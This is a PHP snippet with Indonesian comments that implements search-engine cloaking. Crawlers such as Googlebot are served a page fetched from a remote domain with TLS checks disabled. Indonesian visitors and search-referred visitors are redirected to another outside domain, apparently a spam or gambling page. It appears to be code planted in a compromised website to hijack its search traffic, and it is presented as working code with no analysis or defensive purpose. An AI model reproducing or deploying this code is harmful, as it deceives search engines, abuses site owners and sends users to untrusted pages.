header('Vary: Accept-Language');
header('Vary: User-Agent');

// Mendapatkan User-Agent dan Referer
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';

// Fungsi untuk mendapatkan IP klien
function get_client_ip() {
    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
}

$ip = get_client_ip();

$bot_url = "https://esporttaruna.vip/jangganggu/kecapirit.html"; #url lp
$reff_url = "https://kepencetsikit.xyz/jangganggu/killeramp.html"; #url amp

function ambil_data($url) {
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => 'Accept-language: en\r\n' .
                        'User-Agent: PHP\r\n',
        ],
        'ssl' => [
            'verify_peer' => false, 
            'verify_peer_name' => false, 
        ],
    ]);

    
    $response = @file_get_contents($url, false, $context);

    // Tangani kesalahan jika terjadi
    if ($response === FALSE) {
        return null; 
    }

    return $response;
}

$file = ambil_data($bot_url);

$geolocation_json = ambil_data("http://www.geoplugin.net/json.gp?ip=$ip");
if ($geolocation_json === FALSE) {
    $geolocation = []; // Nilai default jika gagal
} else {
    $geolocation = json_decode($geolocation_json, true);
}
$cc = $geolocation['geoplugin_countryCode'] ?? null;

$botchar = "/(googlebot|slurp|adsense|inspection)/";

if (preg_match($botchar, $ua)) {
    if ($file !== null) {
        echo $file;
    }
    exit;
}

if ($cc === "ID") {
    header("HTTP/1.1 302 Found");
    header("Location: " . $reff_url);
    exit();
}

if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
    header("HTTP/1.1 302 Found");
    header("Location: " . $reff_url);
    exit();
}